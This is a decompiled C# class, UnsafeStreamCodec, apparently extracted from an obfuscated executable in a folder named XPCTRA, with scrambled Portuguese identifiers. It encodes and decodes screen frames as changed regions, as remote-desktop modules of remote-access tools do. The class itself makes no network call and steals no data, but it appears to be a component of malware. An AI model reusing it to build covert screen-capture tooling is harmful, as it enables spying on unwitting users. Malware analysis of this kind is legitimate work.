// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Utilities.UnsafeStreamCodec
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using VERMELHO265MONARCA.Core.Compression;

namespace VERMELHO265MONARCA.Core.Utilities
{
  public class UnsafeStreamCodec : IDisposable
  {
    private readonly object POLIFONICO650IMPOSTURA = new object();
    private int SELVAS849JI;
    private byte[] RIMADO612RESTRITIVO;
    private Bitmap MARQUESA672SINTETICO;
    private PixelFormat OBESO591MESTREESCOLA;
    private int LOCAIS947CATIMBEIRO;
    private int TRANSFORMACIONAL745FESTAS;
    private ARFANTE54HABANERA MULTIPLA908BOFETADA;

    public int Monitor { get; private set; }

    public string Resolution { get; private set; }

    public Size CheckBlock { get; private set; }

    public int ImageQuality
    {
      get
      {
        return this.SELVAS849JI;
      }
      private set
      {
        lock (this.POLIFONICO650IMPOSTURA)
        {
          this.SELVAS849JI = value;
          if (this.MULTIPLA908BOFETADA != null)
            this.MULTIPLA908BOFETADA.Dispose();
          this.MULTIPLA908BOFETADA = new ARFANTE54HABANERA((long) this.SELVAS849JI);
        }
      }
    }

    public UnsafeStreamCodec(int imageQuality, int monitor, string resolution)
    {
      this.ImageQuality = imageQuality;
      this.Monitor = monitor;
      this.Resolution = resolution;
      this.CheckBlock = new Size(50, 1);
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.MARQUESA672SINTETICO != null)
        this.MARQUESA672SINTETICO.Dispose();
      if (this.MULTIPLA908BOFETADA != null)
        this.MULTIPLA908BOFETADA.Dispose();
    }

    public unsafe void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
    {
      lock (this.POLIFONICO650IMPOSTURA)
      {
        byte* int32 = (byte*) scan0.ToInt32();
        if (!outStream.CanWrite)
          throw new Exception("Must have access to Write in the Stream");
        int num1;
        switch (format)
        {
          case PixelFormat.Format24bppRgb:
          case PixelFormat.Format32bppRgb:
            num1 = 3;
            break;
          case PixelFormat.Format32bppPArgb:
          case PixelFormat.Format32bppArgb:
            num1 = 4;
            break;
          default:
            throw new NotSupportedException(format.ToString());
        }
        int stride = imageSize.Width * num1;
        int length = stride * imageSize.Height;
        if (this.RIMADO612RESTRITIVO == null)
        {
          this.OBESO591MESTREESCOLA = format;
          this.LOCAIS947CATIMBEIRO = imageSize.Width;
          this.TRANSFORMACIONAL745FESTAS = imageSize.Height;
          this.RIMADO612RESTRITIVO = new byte[length];
          fixed (byte* numPtr = this.RIMADO612RESTRITIVO)
          {
            byte[] buffer = (byte[]) null;
            using (Bitmap bmp = new Bitmap(imageSize.Width, imageSize.Height, stride, format, scan0))
              buffer = this.MULTIPLA908BOFETADA.Compress(bmp);
            outStream.Write(BitConverter.GetBytes(buffer.Length), 0, 4);
            outStream.Write(buffer, 0, buffer.Length);
            NativeMethods.memcpy(new IntPtr((void*) numPtr), scan0, (uint) length);
          }
        }
        else
        {
          if (this.OBESO591MESTREESCOLA != format)
            throw new Exception("PixelFormat is not equal to previous Bitmap");
          if (this.LOCAIS947CATIMBEIRO != imageSize.Width || this.TRANSFORMACIONAL745FESTAS != imageSize.Height)
            throw new Exception("Bitmap width/height are not equal to previous bitmap");
          long position1 = outStream.Position;
          outStream.Write(new byte[4], 0, 4);
          long num2 = 0;
          List<Rectangle> rectangleList1 = new List<Rectangle>();
          Size size1 = new Size(scanArea.Width, this.CheckBlock.Height);
          Size size2;
          // ISSUE: explicit reference operation
          // ISSUE: variable of a reference type
          Size& local1 = @size2;
          int width1 = scanArea.Width;
          Size checkBlock = this.CheckBlock;
          int width2 = checkBlock.Width;
          int width3 = width1 % width2;
          int height1 = scanArea.Height;
          checkBlock = this.CheckBlock;
          int height2 = checkBlock.Height;
          int height3 = height1 % height2;
          // ISSUE: explicit reference operation
          ^local1 = new Size(width3, height3);
          int num3 = scanArea.Height - size2.Height;
          int num4 = scanArea.Width - size2.Width;
          Rectangle rectangle1 = new Rectangle();
          List<Rectangle> rectangleList2 = new List<Rectangle>();
          size1 = new Size(scanArea.Width, size1.Height);
          fixed (byte* numPtr = this.RIMADO612RESTRITIVO)
          {
            int y1 = scanArea.Y;
            Rectangle rectangle2;
            while (y1 != scanArea.Height)
            {
              if (y1 == num3)
                size1 = new Size(scanArea.Width, size2.Height);
              rectangle1 = new Rectangle(scanArea.X, y1, scanArea.Width, size1.Height);
              int num5 = y1 * stride + scanArea.X * num1;
              if ((uint) NativeMethods.memcmp(numPtr + num5, int32 + num5, (uint) stride) > 0U)
              {
                int index = rectangleList1.Count - 1;
                int num6;
                if (rectangleList1.Count != 0)
                {
                  rectangle2 = rectangleList1[index];
                  int y2 = rectangle2.Y;
                  rectangle2 = rectangleList1[index];
                  int height4 = rectangle2.Height;
                  num6 = y2 + height4 == rectangle1.Y ? 1 : 0;
                }
                else
                  num6 = 0;
                if (num6 != 0)
                {
                  // ISSUE: explicit reference operation
                  // ISSUE: variable of a reference type
                  Rectangle& local2 = @rectangle1;
                  rectangle2 = rectangleList1[index];
                  int x = rectangle2.X;
                  rectangle2 = rectangleList1[index];
                  int y2 = rectangle2.Y;
                  rectangle2 = rectangleList1[index];
                  int width4 = rectangle2.Width;
                  rectangle2 = rectangleList1[index];
                  int height4 = rectangle2.Height + rectangle1.Height;
                  // ISSUE: explicit reference operation
                  ^local2 = new Rectangle(x, y2, width4, height4);
                  rectangleList1[index] = rectangle1;
                }
                else
                  rectangleList1.Add(rectangle1);
              }
              y1 += size1.Height;
            }
            for (int index1 = 0; index1 < rectangleList1.Count; ++index1)
            {
              // ISSUE: explicit reference operation
              // ISSUE: variable of a reference type
              Size& local2 = @size1;
              checkBlock = this.CheckBlock;
              int width4 = checkBlock.Width;
              rectangle2 = rectangleList1[index1];
              int height4 = rectangle2.Height;
              // ISSUE: explicit reference operation
              ^local2 = new Size(width4, height4);
              int x1 = scanArea.X;
              while (x1 != scanArea.Width)
              {
                if (x1 == num4)
                {
                  // ISSUE: explicit reference operation
                  // ISSUE: variable of a reference type
                  Size& local3 = @size1;
                  int width5 = size2.Width;
                  rectangle2 = rectangleList1[index1];
                  int height5 = rectangle2.Height;
                  // ISSUE: explicit reference operation
                  ^local3 = new Size(width5, height5);
                }
                // ISSUE: explicit reference operation
                // ISSUE: variable of a reference type
                Rectangle& local4 = @rectangle1;
                int x2 = x1;
                rectangle2 = rectangleList1[index1];
                int y2 = rectangle2.Y;
                int width6 = size1.Width;
                rectangle2 = rectangleList1[index1];
                int height6 = rectangle2.Height;
                // ISSUE: explicit reference operation
                ^local4 = new Rectangle(x2, y2, width6, height6);
                bool flag = false;
                uint count = (uint) (num1 * rectangle1.Width);
                for (int index2 = 0; index2 < rectangle1.Height; ++index2)
                {
                  int num5 = stride * (rectangle1.Y + index2) + num1 * rectangle1.X;
                  if ((uint) NativeMethods.memcmp(numPtr + num5, int32 + num5, count) > 0U)
                    flag = true;
                  NativeMethods.memcpy((void*) (numPtr + num5), (void*) (int32 + num5), count);
                }
                if (flag)
                {
                  int index2 = rectangleList2.Count - 1;
                  int num5;
                  if (rectangleList2.Count > 0)
                  {
                    rectangle2 = rectangleList2[index2];
                    int x3 = rectangle2.X;
                    rectangle2 = rectangleList2[index2];
                    int width5 = rectangle2.Width;
                    num5 = x3 + width5 == rectangle1.X ? 1 : 0;
                  }
                  else
                    num5 = 0;
                  if (num5 != 0)
                  {
                    Rectangle rectangle3 = rectangleList2[index2];
                    int width5 = rectangle1.Width + rectangle3.Width;
                    rectangle1 = new Rectangle(rectangle3.X, rectangle3.Y, width5, rectangle3.Height);
                    rectangleList2[index2] = rectangle1;
                  }
                  else
                    rectangleList2.Add(rectangle1);
                }
                x1 += size1.Width;
              }
            }
          }
          for (int index = 0; index < rectangleList2.Count; ++index)
          {
            Rectangle rectangle2 = rectangleList2[index];
            int num5 = num1 * rectangle2.Width;
            Bitmap bmp = (Bitmap) null;
            BitmapData bitmapdata = (BitmapData) null;
            long num6;
            try
            {
              bmp = new Bitmap(rectangle2.Width, rectangle2.Height, format);
              bitmapdata = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);
              int num7 = 0;
              int num8 = 0;
              for (; num7 < rectangle2.Height; ++num7)
              {
                int num9 = stride * (rectangle2.Y + num7) + num1 * rectangle2.X;
                NativeMethods.memcpy((void*) ((IntPtr) bitmapdata.Scan0.ToPointer() + num8), (void*) (int32 + num9), (uint) num5);
                num8 += num5;
              }
              outStream.Write(BitConverter.GetBytes(rectangle2.X), 0, 4);
              outStream.Write(BitConverter.GetBytes(rectangle2.Y), 0, 4);
              outStream.Write(BitConverter.GetBytes(rectangle2.Width), 0, 4);
              outStream.Write(BitConverter.GetBytes(rectangle2.Height), 0, 4);
              outStream.Write(new byte[4], 0, 4);
              num6 = outStream.Length;
              long position2 = outStream.Position;
              this.MULTIPLA908BOFETADA.Compress(bmp, ref outStream);
              num6 = outStream.Position - num6;
              outStream.Position = position2 - 4L;
              outStream.Write(BitConverter.GetBytes(num6), 0, 4);
              outStream.Position += num6;
            }
            finally
            {
              bmp.UnlockBits(bitmapdata);
              bmp.Dispose();
            }
            num2 += num6 + 20L;
          }
          outStream.Position = position1;
          outStream.Write(BitConverter.GetBytes(num2), 0, 4);
        }
      }
    }

    public unsafe Bitmap DecodeData(IntPtr codecBuffer, uint length)
    {
      if (length < 4U)
        return this.MARQUESA672SINTETICO;
      int length1 = *(int*) (void*) codecBuffer;
      if (this.MARQUESA672SINTETICO != null)
        return this.MARQUESA672SINTETICO;
      byte[] buffer = new byte[length1];
      fixed (byte* numPtr = buffer)
        NativeMethods.memcpy(new IntPtr((void*) numPtr), new IntPtr(codecBuffer.ToInt32() + 4), (uint) length1);
      this.MARQUESA672SINTETICO = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer));
      return this.MARQUESA672SINTETICO;
    }

    public Bitmap DecodeData(Stream inStream)
    {
      byte[] buffer1 = new byte[4];
      inStream.Read(buffer1, 0, 4);
      int int32_1 = BitConverter.ToInt32(buffer1, 0);
      if (this.MARQUESA672SINTETICO == null)
      {
        byte[] buffer2 = new byte[int32_1];
        inStream.Read(buffer2, 0, buffer2.Length);
        this.MARQUESA672SINTETICO = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer2));
        return this.MARQUESA672SINTETICO;
      }
      using (Graphics graphics = Graphics.FromImage((Image) this.MARQUESA672SINTETICO))
      {
        while (int32_1 > 0)
        {
          byte[] buffer2 = new byte[20];
          inStream.Read(buffer2, 0, buffer2.Length);
          Rectangle rectangle = new Rectangle(BitConverter.ToInt32(buffer2, 0), BitConverter.ToInt32(buffer2, 4), BitConverter.ToInt32(buffer2, 8), BitConverter.ToInt32(buffer2, 12));
          int int32_2 = BitConverter.ToInt32(buffer2, 16);
          byte[] buffer3 = new byte[int32_2];
          inStream.Read(buffer3, 0, buffer3.Length);
          using (MemoryStream memoryStream = new MemoryStream(buffer3))
          {
            using (Bitmap bitmap = (Bitmap) Image.FromStream((Stream) memoryStream))
              graphics.DrawImage((Image) bitmap, rectangle.Location);
          }
          int32_1 -= int32_2 + 20;
        }
      }
      return this.MARQUESA672SINTETICO;
    }
  }
}
